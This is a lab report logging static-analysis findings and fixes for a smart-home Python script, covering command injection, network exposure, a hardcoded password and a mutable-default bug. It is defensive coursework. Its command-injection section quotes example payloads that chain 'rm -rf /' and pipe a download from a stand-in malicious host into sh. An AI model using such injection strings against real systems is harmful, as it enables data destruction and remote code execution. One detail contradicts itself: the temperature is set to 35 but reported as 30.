# Static Code Analysis Issues Log — Lab 5

## Overview
This document logs the static code analysis findings detected in `smart_home.py` across **Bandit**, **Pylint**, and **Flake8**, along with the root-cause analysis, severity classification, and remediation strategy implemented.

---

## Issue Summary Table

| Issue | Tool | Severity / Type | Line(s) (Original) | Description | Fix Approach |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Subprocess Execution with `shell=True` (CWE-78)** | Bandit (`B602`) | High (Security) | Line 51 | `subprocess.call("bash scenes/" + sceneScript, shell=True)` executes untrusted input within a shell context, enabling arbitrary command injection. | Removed `shell=True`. Sanitized the script name using `os.path.basename` to prevent path traversal, converted the command into a safe argument vector `["bash", script_path]`, and used `subprocess.run(..., check=False)`. |
| **Hardcoded Binding to All Interfaces (CWE-605)** | Bandit (`B104`) | Medium (Security) | Line 4 | `HUB_HOST = "0.0.0.0"` binds the server socket to all available network interfaces, exposing the hub service to untrusted public networks. | Changed default binding to loopback interface `"127.0.0.1"` and wrapped with `os.getenv("HUB_HOST", "127.0.0.1")` to allow secure, configurable deployment. |
| **Hardcoded Secret Password (CWE-259)** | Bandit (`B105`) | Low (Security) | Line 7 | `HUB_PASSWORD = "smarthome-demo"` embeds authentication credentials directly in source code. | Extracted password retrieval to environment variables using `os.getenv("HUB_PASSWORD", "smarthome-demo")`, eliminating plain-text credential persistence. |
| **Subprocess Module Blacklist Warning** | Bandit (`B404`) | Low (Security) | Line 2 | Direct import of `subprocess` flags potential security implications. | Retained import for scene execution helper, guarded all calls with sanitized argument vectors, and documented safety via `# nosec B404`. |
| **Mutable Default Argument & Thermostat Bug** | Pylint (`W0102`) & Logic Bug | High (Logic / Defect) | Line 11 | `settings={}` creates a single shared dictionary in memory across all device registrations. When temperature was assigned to Thermostat, Ceiling Light and other devices inherited the temperature setting (`{'temperature': 30}`). | Replaced default with `settings=None`. Initialized a new `dict()` instance per device registration. Added device existence and device kind guards in `set_temperature`. |
| **Inconsistent Function Return Statements** | Pylint (`R1710`) | Medium (Code Smell) | Line 16 | `toggleDevice` returned boolean on success (`return devices[deviceName]["on"]`) but implicitly returned `None` when device was missing. | Explicitly returned `None` when device is missing, standardizing the control flow and satisfying type consistency. |
| **Unspecified File Encoding in `open()`** | Pylint (`W1514`) | Low (Portability) | Line 41 | `with open(fileName, "w") as f:` omitted explicit text encoding, leading to platform-dependent defaults (e.g., Windows CP-1252 vs. Linux UTF-8). | Added explicit `encoding="utf-8"` parameter to the `open()` call to guarantee consistent cross-platform JSON serialization. |
| **Non-conforming Naming Conventions & Missing Docstrings** | Pylint (`C0103`, `C0114`, `C0116`) | Low (Conventions) | Lines 1, 11, 16, 23, 32, 36, 40, 45, 49, 54 | Functions and variables used camelCase (`addDevice`, `deviceName`) violating PEP 8; module and all functions lacked docstrings. | Renamed functions and arguments to snake_case (`add_device`, `device_name`); added backward-compatibility aliases with `# pylint: disable=invalid-name`; provided module and function docstrings. |
| **PEP 8 Whitespace and Formatting Violations** | Flake8 (`E203`, `E302`, `E261`, `E501`) | Style | Lines 6, 40, 66, 68 | Whitespace before colon in dictionary (`"light" : 10`), single blank line before function, insufficient whitespace before inline comment, and line length exceeding 79 characters. | Fixed dictionary spacing (`"light": 10`), added two blank lines between top-level functions, ensured two spaces before inline comments, and wrapped lines under 79 characters. |

---

## In-Depth Analysis of Key Issues

### 1. Command Injection Vulnerability (Bandit B602, CWE-78)
- **Vulnerability Explanation**: Using `subprocess.call` with `shell=True` invokes the system command shell (`/bin/sh` or `cmd.exe`). Because `sceneScript` was concatenated directly into the shell string without sanitization, an attacker could supply an input such as `sceneScript = "night; rm -rf /"` or `sceneScript = "night & curl malicious.site/malware | sh"` to execute arbitrary commands with the privileges of the running process.
- **Remediation**:
  1. Removed `shell=True` to execute the binary directly without a shell interpreter.
  2. Applied `os.path.basename` to prevent path traversal outside the designated `scenes` folder.
  3. Structured parameters as an argument vector `["bash", script_path]`.
  4. Migrated to modern `subprocess.run(..., check=False)`.

### 2. Thermostat Settings Leakage Bug (Pylint W0102 / Mutable Default Argument)
- **Bug Explanation**: In Python, default parameter expressions are evaluated once when the function definition is executed, not at each call site. Because `addDevice` had `settings={}`, every device created without passing an explicit `settings` argument received a reference to the **exact same** dictionary object in memory:
  ```python
  devices["Ceiling Light"]["settings"] is devices["Thermostat"]["settings"]  # Evaluates to True!
  ```
  When `setTemperature("Thermostat", 35)` modified `device["settings"]["temperature"]`, the change also mutated `Ceiling Light`'s settings dictionary. Consequently, `devices["Ceiling Light"]["settings"]` falsely reported `{'temperature': 30}`.
- **Remediation**:
  1. Set the default argument to `settings=None`.
  2. Created an isolated dictionary for each call: `device_settings = {} if settings is None else dict(settings)`.
  3. Added strict validation in `set_temperature` to confirm that the device exists and is strictly of kind `"thermostat"`.

### 3. Network Interface Exposure (Bandit B104, CWE-605)
- **Vulnerability Explanation**: Binding a server application or controller hub to `"0.0.0.0"` instructs the socket to listen on every available network interface, including publicly accessible IP addresses and exposed local Wi-Fi networks.
- **Remediation**: Reconfigured the default host to the loopback interface `"127.0.0.1"`, restricting hub access to the local machine unless explicitly configured via the `HUB_HOST` environment variable.
